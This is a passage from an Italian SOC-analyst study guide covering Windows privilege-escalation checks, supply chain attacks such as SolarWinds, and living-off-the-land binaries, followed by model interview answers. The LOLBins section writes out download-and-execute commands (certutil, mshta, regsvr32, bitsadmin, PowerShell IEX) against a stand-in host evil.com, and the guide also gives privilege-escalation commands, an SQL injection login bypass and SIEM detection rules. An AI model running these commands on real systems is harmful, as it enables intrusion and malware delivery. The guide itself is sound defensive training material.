| **Unquoted Service Path** | Se il percorso di un servizio contiene spazi e non è tra virgolette, si può iniettare un binario | `wmic service get name,pathname,startmode` |
| **DLL Hijacking** | Posizionare una DLL malevola in una directory cercata prima di quella legittima | Process Monitor (ProcMon) |
| **AlwaysInstallElevated** | Se abilitato, qualsiasi .msi viene installato con privilegi SYSTEM | `reg query` (vedi sotto) |
| **Scheduled Tasks** | Task pianificati che eseguono script scrivibili dall'utente corrente | `schtasks /query /fo LIST /v` |

```powershell
# === Enumerazione per Privilege Escalation su Windows ===

# 1. Controllare i privilegi correnti
whoami /priv
# Privilegio pericoloso: SeImpersonatePrivilege → Potato attacks (JuicyPotato, PrintSpoofer)

# 2. Cercare Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# 3. Controllare AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Se entrambi = 1, qualsiasi utente può installare MSI come SYSTEM

# 4. Cercare credenziali salvate
cmdkey /list
# Se ci sono credenziali salvate: runas /savecred /user:DOMAIN\admin cmd.exe

# 5. Controllare i servizi con permessi deboli
accesschk.exe /accepteula -uwcqv "Users" * /svc

# 6. Tool automatici
# WinPEAS — script di enumerazione completo
.\winPEASany.exe
```

---

## 🔗 Supply Chain Attack

### Cos'è e Perché è Pericoloso

Un **Supply Chain Attack** compromette un fornitore o un componente nella catena di fornitura del software per raggiungere il bersaglio finale. È estremamente pericoloso perché:

- **Fiducia implicita:** Le organizzazioni si fidano dei propri fornitori software
- **Scala massiva:** Un singolo fornitore compromesso può infettare migliaia di clienti
- **Difficile da rilevare:** Il malware arriva come aggiornamento "legittimo" firmato digitalmente
- **Superficie d'attacco enorme:** Include codice sorgente, build systems, repository, aggiornamenti, librerie di terze parti

### Esempio Dettagliato: SolarWinds Orion (SUNBURST) — 2020

**Cronologia dell'attacco:**
1. **Ottobre 2019:** Gli attaccanti (APT29 / Cozy Bear, attribuiti alla Russia) compromettono il build system di SolarWinds
2. **Febbraio 2020:** Il codice malevolo (SUNBURST backdoor) viene inserito nel processo di build di Orion
3. **Marzo 2020:** L'aggiornamento contenente la backdoor (versioni 2019.4 - 2020.2.1) viene distribuito a ~18.000 clienti
4. **Dicembre 2020:** FireEye scopre la compromissione durante l'indagine su un proprio breach

**Come funzionava SUNBURST:**
- Dormiva 12-14 giorni dopo l'installazione prima di attivarsi (evasione sandbox)
- Comunicava con C2 tramite DNS (subdomain di `avsvmcloud.com`)
- I nomi DNS erano codificati e contenevano informazioni sulla vittima
- Il C2 rispondeva con istruzioni: raccogliere dati, eseguire comandi, muoversi lateralmente
- Verificava la presenza di tool di sicurezza e si disattivava se rilevava un ambiente di analisi

**Impatto:** Dipartimenti del Governo USA (Tesoro, Commercio, Homeland Security), Microsoft, FireEye, Intel, Cisco — tra i più devastanti attacchi mai avvenuti.

### Altri Esempi Notevoli

| Attacco | Anno | Dettagli |
|---------|------|----------|
| **Kaseya VSA** | 2021 | REvil ransomware distribuito tramite il software di gestione remota Kaseya → 1.500+ aziende colpite |
| **Codecov** | 2021 | Script di bash nel processo CI/CD di Codecov modificato per esfiltrare variabili d'ambiente (token, chiavi API) |
| **Log4Shell** | 2021 | Vulnerabilità critica (CVE-2021-44228) nella libreria Log4j, usata in milioni di applicazioni Java |
| **3CX** | 2023 | L'applicazione desktop VoIP 3CX è stata compromessa — supply chain di una supply chain |
| **XZ Utils** | 2024 | Backdoor inserita nella libreria di compressione xz da un contributor apparentemente affidabile dopo anni di contributi |

### Come un SOC Può Difendersi

| Difesa | Descrizione |
|--------|-------------|
| **Software Bill of Materials (SBOM)** | Inventario completo di tutti i componenti software e le loro dipendenze |
| **Verifica degli hash** | Confrontare gli hash dei download con quelli pubblicati dal vendor |
| **Code Signing Verification** | Verificare che gli aggiornamenti siano firmati con certificati validi del vendor |
| **Network Segmentation** | Limitare le comunicazioni dei server di gestione solo ai necessari |
| **Zero Trust** | Non fidarsi implicitamente di nessun componente, anche se "interno" |
| **Monitoraggio DNS** | Rilevare comunicazioni DNS anomale (DGA, subdomain tunneling) |
| **Vendor Risk Assessment** | Valutare la postura di sicurezza dei fornitori prima di adottare il loro software |
| **Dependency Scanning** | Scansione automatica delle dipendenze per vulnerabilità note (Dependabot, Snyk) |

---

## 🖥️ Living off the Land (LOLBins)

### Cos'è la Tecnica

**Living off the Land (LotL)** è una tecnica in cui gli attaccanti utilizzano strumenti già presenti nel sistema operativo (binari legittimi, script engine, utility di sistema) per eseguire attività malevole. Questo rende il rilevamento estremamente difficile perché:

- Gli strumenti usati sono **legittimi** e **firmati digitalmente** da Microsoft
- Non vengono scaricati malware aggiuntivi (niente da rilevare come "file malevolo")
- Le attività si confondono con l'uso normale degli strumenti da parte degli amministratori
- Gli antivirus tradizionali (signature-based) non li rilevano

### LOLBins Comuni su Windows

| LOLBin | Uso Legittimo | Uso Malevolo |
|--------|---------------|--------------|
| **certutil.exe** | Gestione certificati | Download di file, encoding/decoding Base64 |
| **mshta.exe** | Esecuzione di HTML Applications (.hta) | Esecuzione di script remoti |
| **rundll32.exe** | Esecuzione di funzioni in DLL | Esecuzione di DLL malevole |
| **regsvr32.exe** | Registrazione DLL COM | Download ed esecuzione di script remoti (Squiblydoo) |
| **bitsadmin.exe** | Gestione trasferimenti in background | Download silenzioso di malware |
| **powershell.exe** | Scripting e automazione | Esecuzione di comandi encoded, download in memoria |
| **wmic.exe** | Gestione Windows Management | Esecuzione remota, reconnaissance |
| **msiexec.exe** | Installazione pacchetti MSI | Installazione di payload malevoli da URL |

### Esempi di Comandi Usati dagli Attaccanti

```powershell
# === CERTUTIL — Download di malware ===
certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\Temp\update.exe
# Scarica un file da un URL e lo salva localmente

# CERTUTIL — Encoding/Decoding Base64
certutil.exe -encode malware.exe encoded.txt
certutil.exe -decode encoded.txt malware.exe
# Usato per offuscare payload

# === MSHTA — Esecuzione di script remoto ===
mshta.exe http://evil.com/payload.hta
# Scarica ed esegue un file HTA che può contenere VBScript/JScript

mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('calc.exe');close()"
# Esegue JavaScript direttamente

# === REGSVR32 — Squiblydoo Attack ===
regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
# Scarica ed esegue un COM scriptlet remoto, bypassa AppLocker

# === BITSADMIN — Download silenzioso ===
bitsadmin /transfer job /download /priority high http://evil.com/malware.exe C:\Temp\update.exe
# Usa il servizio BITS per scaricare file in background

# === POWERSHELL — Encoded Command ===
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBk
# Il comando codificato in Base64 può nascondere qualsiasi operazione

# Decodificare un comando encoded per analisi:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBk'))

# POWERSHELL — Download ed esecuzione in memoria (fileless)
powershell.exe -exec bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
# Scarica ed esegue uno script PowerShell direttamente in memoria — nessun file su disco

# === WMIC — Esecuzione remota ===
wmic /node:192.168.1.100 process call create "cmd.exe /c whoami > C:\temp\output.txt"
# Esegue comandi su una macchina remota

# === RUNDLL32 — Esecuzione di DLL malevola ===
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")
# Esegue JavaScript attraverso rundll32
```

### Come Rilevarli nel SOC

**Regole SIEM (esempio Splunk/Elastic):**
```
# Regola: Certutil usato per download
index=windows EventCode=4688 NewProcessName="*certutil*" CommandLine="*urlcache*"

# Regola: PowerShell con comando encoded
index=windows EventCode=4688 NewProcessName="*powershell*" CommandLine="*-EncodedCommand*"

# Regola: PowerShell con download in memoria
index=windows EventCode=4688 NewProcessName="*powershell*"
  (CommandLine="*DownloadString*" OR CommandLine="*DownloadFile*" OR CommandLine="*IEX*" OR CommandLine="*Invoke-Expression*")

# Regola: MSHTA che carica URL remoto
index=windows EventCode=4688 NewProcessName="*mshta*" CommandLine="*http*"

# Regola: Regsvr32 con script remoto (Squiblydoo)
index=windows EventCode=4688 NewProcessName="*regsvr32*" CommandLine="*scrobj*"

# Regola: Bitsadmin per download
index=windows EventCode=4688 NewProcessName="*bitsadmin*" CommandLine="*transfer*"
```

**EDR Alerts da monitorare:**
- Processi di sistema che generano connessioni di rete in uscita insolite
- PowerShell che esegue comandi codificati o che scarica in memoria
- Processi child anomali (es. `mshta.exe` che genera `cmd.exe` o `powershell.exe`)
- Certutil o bitsadmin che scaricano file eseguibili

---

## 📊 Tabella Riassuntiva

| Attacco | Vettore | Indicatori nel SOC | Difesa Principale |
|---------|---------|--------------------|--------------------|
| **Phishing** | Email con link/allegati malevoli | SPF/DKIM/DMARC fail, domini typosquatting, allegati sospetti | Email gateway, awareness training, MFA |
| **Ransomware** | Phishing, RDP, exploit | Shadow copy cancellate, estensioni file anomale, C2 traffic | Backup offline, patching, EDR, network segmentation |
| **DDoS** | Traffico di rete massivo | Spike anomalo nel traffico, SYN_RECV elevati, stessi pattern | CDN/DDoS protection, rate limiting, SYN cookies |
| **SQL Injection** | Input non sanificato in web app | Caratteri SQL nei parametri URL, errori 500, UNION/SELECT nei log | Prepared statements, WAF, input validation |
| **XSS** | Script iniettato in pagine web | Tag `<script>` in input/output, CSP violations | Output encoding, CSP, HttpOnly cookies |
| **Brute Force** | Tentativi ripetuti di login | Event 4625 massivi, auth.log con molti "Failed password" | Account lockout, MFA, fail2ban, rate limiting |
| **MitM** | Intercettazione del traffico di rete | MAC duplicati nella ARP table, certificati SSL non validi | HTTPS/HSTS, VPN, certificate pinning, 802.1X |
| **Privilege Escalation** | Misconfigurazioni, exploit | Processi con privilegi anomali, comandi sudo insoliti | Principio minimo privilegio, patching, monitoraggio |
| **Supply Chain** | Software/aggiornamenti compromessi | DNS anomalo, C2 da software trusted, comportamento insolito | SBOM, hash verification, vendor assessment, zero trust |
| **LOLBins** | Binari legittimi usati per scopi malevoli | Certutil/PowerShell download, encoded commands, child processes anomali | EDR, SIEM rules, Application Whitelisting, Script Block Logging |

---

## 🎯 Domande da Colloquio

### 1. Come analizzeresti un'email di phishing segnalata da un utente?

**Risposta modello:**
"Prima di tutto, chiederei all'utente se ha cliccato su link o aperto allegati, e creerei un ticket. Poi esporterei il file .eml originale per analizzare gli header: controllerei il Return-Path confrontandolo con il From visibile, verificherei i risultati di SPF, DKIM e DMARC, e analizzerei la catena dei server Received per identificare l'origine reale. Successivamente, estrarei tutti gli URL e gli allegati senza aprirli, li sottometterei a VirusTotal, URLScan.io e una sandbox come Any.Run. Se l'utente ha interagito con il phishing, procederei con il contenimento: reset password, verifica MFA, e se ha aperto allegati, isolamento del dispositivo e scansione EDR. Infine, aggiungerei gli IOC (domini, IP, hash) alle blocklist aziendali."

### 2. Spiegami il ciclo di attacco di un ransomware e come lo rileveresti in ogni fase.

**Risposta modello:**
"Il ciclo tipico parte con l'Initial Access, solitamente tramite phishing o RDP esposto — nel SOC cercherei email sospette o login RDP da IP insoliti. Poi c'è l'Execution dove il payload viene eseguito — monitorerei processi child di Outlook o Word che generano PowerShell. Segue il Lateral Movement tramite PsExec, WMI o Pass-the-Hash — cercherei Event ID 4648 e connessioni SMB anomale. Prima della cifratura, spesso c'è l'Exfiltration — monitorerei upload massivi verso IP esterni. Infine la cifratura stessa — cercherei la cancellazione delle Shadow Copy con vssadmin, la disabilitazione di servizi di backup, e la comparsa di estensioni file insolite o note di riscatto."

### 3. Qual è la differenza tra un attacco DoS e un DDoS? Come li mitigheresti?

**Risposta modello:**
"Un DoS proviene da una singola sorgente ed è relativamente facile da mitigare bloccando quell'IP. Un DDoS proviene da migliaia o milioni di sorgenti, spesso una botnet, rendendo il blocco per IP inefficace. Per la mitigazione di un DDoS, userei servizi CDN come Cloudflare o Akamai che assorbono il traffico volumetrico. A livello infrastrutturale, abiliterei SYN cookies per contrastare SYN flood, implementerei rate limiting per attacchi application layer come HTTP flood, e se necessario, coordinerei con l'ISP per blackhole routing. A lungo termine, considererei l'adozione di un'architettura anycast per distribuire il traffico."

### 4. Come rileveresti un attacco brute force su un sistema Windows e quali contromisure implementeresti?

**Risposta modello:**
"Monitorerei l'Event ID 4625 (logon falliti) nel Security Event Log, cercando un numero anomalo dallo stesso IP sorgente in un breve intervallo. Creerei una regola SIEM che genera un alert quando ci sono più di 10 Event 4625 in 5 minuti dallo stesso IP. Presterei particolare attenzione a un Event ID 4624 (logon riuscito) che segue molti 4625 per lo stesso utente — segno che il brute force ha avuto successo. Come contromisure: implementerei account lockout dopo 5 tentativi, MFA obbligatorio, rate limiting sui servizi di autenticazione, e blocco degli IP tramite threat intelligence feeds."

### 5. Cos'è un attacco SQL Injection e come si previene?

**Risposta modello:**
"La SQL Injection avviene quando l'input dell'utente viene inserito direttamente in una query SQL senza sanificazione. L'attaccante può manipolare la query per accedere a dati non autorizzati, modificare il database, o eseguire comandi. Ad esempio, in un form di login, inserendo `admin' OR '1'='1' --` come username, la condizione diventa sempre vera. La difesa principale sono i prepared statements o parameterized queries, dove l'input dell'utente è trattato sempre come dato e mai come codice SQL. Inoltre, un WAF con regole OWASP CRS può bloccare molti pattern di SQLi, e l'account database dell'applicazione dovrebbe avere solo i permessi strettamente necessari."

### 6. Spiegami la differenza tra Reflected, Stored e DOM-based XSS.

**Risposta modello:**
"Nel Reflected XSS, il payload malevolo è nella richiesta HTTP e viene riflesso nella risposta — richiede che la vittima clicchi su un link appositamente creato. Nello Stored XSS, il payload viene salvato nel database (es. un commento in un forum) e viene eseguito per ogni utente che visualizza quella pagina — è più pericoloso perché non richiede interazione specifica. Nel DOM-based XSS, il payload manipola il DOM del browser direttamente tramite JavaScript lato client, senza passare dal server — il payload è tipicamente nel fragment dell'URL dopo il #. Le difese includono output encoding, Content Security Policy, flag HttpOnly sui cookie di sessione, e l'uso di framework moderni che applicano auto-escaping."

### 7. Come funziona un attacco Man-in-the-Middle tramite ARP Spoofing?

**Risposta modello:**
"L'ARP Spoofing sfrutta il fatto che il protocollo ARP non ha meccanismi di autenticazione. L'attaccante invia pacchetti ARP Reply falsificati sulla rete locale, associando il proprio MAC address all'IP del gateway. Di conseguenza, il traffico della vittima destinato a Internet viene instradato attraverso la macchina dell'attaccante, che può intercettarlo, modificarlo, o rubarne le credenziali. Per rilevarlo, si può monitorare la tabella ARP cercando IP diversi con lo stesso MAC address, o usare tool come arpwatch. Le difese includono l'uso di HTTPS con HSTS, VPN per cifrare il traffico, entry ARP statiche per il gateway, e autenticazione di rete con 802.1X."

### 8. Cos'è un Supply Chain Attack e puoi descrivere il caso SolarWinds?

**Risposta modello:**
"Un Supply Chain Attack compromette un fornitore o un componente nella catena di fornitura per raggiungere il bersaglio finale. Nel caso SolarWinds (2020), l'APT29 russo ha compromesso il build system del software Orion, inserendo la backdoor SUNBURST in un aggiornamento legittimo distribuito a circa 18.000 clienti. La backdoor dormiva 12-14 giorni prima di attivarsi, comunicava con il C2 tramite DNS codificato verso avsvmcloud.com, e verificava la presenza di tool di analisi per evitare il rilevamento. L'impatto ha colpito agenzie governative USA, Microsoft, FireEye e molte altre. Per difendersi, un SOC dovrebbe implementare SBOM, monitoraggio DNS anomalo, verificare gli hash degli aggiornamenti, e adottare un approccio zero trust anche per il software dei fornitori."

### 9. Cos'è la tecnica Living off the Land e perché è difficile da rilevare?

**Risposta modello:**
"Living off the Land (LotL) è una tecnica dove gli attaccanti usano strumenti già presenti nel sistema operativo per eseguire attività malevole, invece di scaricare malware. Su Windows, i LOLBins comuni includono certutil per il download di file, PowerShell con comandi encoded per l'esecuzione fileless, mshta per eseguire script remoti, e regsvr32 per il Squiblydoo attack. È difficile da rilevare perché questi binari sono firmati da Microsoft e il loro uso è legittimo in molti contesti. Per rilevarli, è necessario un EDR che monitora il comportamento dei processi, regole SIEM specifiche come il rilevamento di certutil con il parametro urlcache, e l'abilitazione di PowerShell Script Block Logging per registrare i comandi eseguiti."

### 10. Se ricevi un alert del SIEM che indica la cancellazione delle Shadow Copy, come reagisci?

**Risposta modello:**
"La cancellazione delle Shadow Copy (vssadmin delete shadows) è un indicatore critico di ransomware in fase di pre-cifratura. Agirei immediatamente: primo, verificherei quale utente e processo ha eseguito il comando, controllando l'Event ID 4688. Secondo, isolerei immediatamente la macchina dalla rete per prevenire il lateral movement e la cifratura. Terzo, controllerei se ci sono segni di lateral movement su altre macchine della rete. Quarto, verificherei se ci sono connessioni C2 attive dal dispositivo compromesso. Quinto, dichiarerei un incidente e coinvolgerei il team di Incident Response. Contemporaneamente, verificherei lo stato dei backup per assicurarmi che non siano stati compromessi."

### 11. Quali sono le principali differenze tra Brute Force e Credential Stuffing, e quale è più pericoloso?

**Risposta modello:**
"Il Brute Force prova sistematicamente tutte le combinazioni possibili di password, mentre il Credential Stuffing usa coppie username/password già rubate da data breach precedenti. Il Credential Stuffing è generalmente più pericoloso perché sfrutta il fatto che molti utenti riusano le stesse credenziali su più servizi, quindi il tasso di successo è molto più alto. Inoltre, il Credential Stuffing è più difficile da rilevare perché ogni tentativo usa credenziali diverse e può essere distribuito su molti IP, non generando il classico pattern di molti tentativi falliti dallo stesso IP. La difesa più efficace per entrambi è l'MFA, che rende inutili anche le credenziali corrette senza il secondo fattore."

### 12. Come verificheresti se un sistema Linux è stato compromesso tramite privilege escalation?

**Risposta modello:**
"Controllerei diversi indicatori: primo, cercherei binari SUID insoliti con `find / -perm -4000`, confrontando con una baseline nota del sistema. Secondo, verificherei i log di sudo (`/var/log/auth.log`) per comandi eseguiti come root da utenti non autorizzati. Terzo, controllerei `/etc/passwd` e `/etc/shadow` per utenti aggiunti di recente o con UID 0. Quarto, esaminerei i crontab per script sospetti eseguiti come root. Quinto, verificherei la versione del kernel per exploit noti come DirtyCow o DirtyPipe. Sesto, controllerei le capabilities con `getcap -r /` per binari con permessi elevati. Infine, esaminerei i processi attivi e le connessioni di rete per comportamenti anomali."

### 13. Descrivi come analizzeresti un possibile attacco DDoS in corso.

**Risposta modello:**
"Prima di tutto, verificherei le metriche di rete: banda in ingresso, pacchetti al secondo, e connessioni attive. Se c'è un picco anomalo, analizzerei il tipo di traffico per classificare l'attacco. Per un volumetrico (es. UDP/DNS amplification), vedrei un'enorme quantità di pacchetti da molti IP sorgente verso pochi IP interni. Per un SYN flood, controllerei con `netstat` il numero di connessioni in stato SYN_RECV. Per un attacco Layer 7 (HTTP flood), analizzerei i log del web server cercando pattern: stesso User-Agent da IP diversi, richieste identiche ripetute, o frequenza di richieste anomala. Come risposta immediata, contatterei il provider CDN/DDoS protection per attivare la mitigazione, implementerei rate limiting sull'IP o il range più aggressivo, e se necessario, coordinerei con l'ISP per blackhole routing come ultima risorsa."

### 14. Come proteggeresti un'organizzazione da un attacco di tipo Supply Chain?

**Risposta modello:**
"Adotterei un approccio multilivello: primo, implementerei un Software Bill of Materials (SBOM) per avere un inventario completo di tutti i componenti software e le loro dipendenze. Secondo, verificherei gli hash e le firme digitali di tutti gli aggiornamenti prima dell'installazione. Terzo, segmenterei la rete per limitare le comunicazioni dei server di gestione solo alle destinazioni necessarie. Quarto, monitorerei il traffico DNS per rilevare comunicazioni anomale come il domain generation algorithm o DNS tunneling — indicatori tipici di backdoor come SUNBURST. Quinto, adotterei la filosofia Zero Trust, non fidandomi implicitamente di nessun software o fornitore. Sesto, implementerei dependency scanning automatico con tool come Snyk o Dependabot per le librerie open source. Infine, eseguirei vendor risk assessment periodici per valutare la postura di sicurezza dei fornitori critici."

---

> **📌 Risorse aggiuntive:**
> - [MITRE ATT&CK Framework](https://attack.mitre.org/) — Catalogo completo delle tattiche e tecniche degli attaccanti
> - [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Le 10 vulnerabilità web più critiche
> - [GTFOBins](https://gtfobins.github.io/) — Database di LOLBins Linux
> - [LOLBAS](https://lolbas-project.github.io/) — Database di LOLBins Windows
> - [VirusTotal](https://www.virustotal.com/) — Analisi di file e URL sospetti
> - [URLScan.io](https://urlscan.io/) — Scansione di URL sospetti
> - [Any.Run](https://any.run/) — Sandbox interattiva per analisi malware
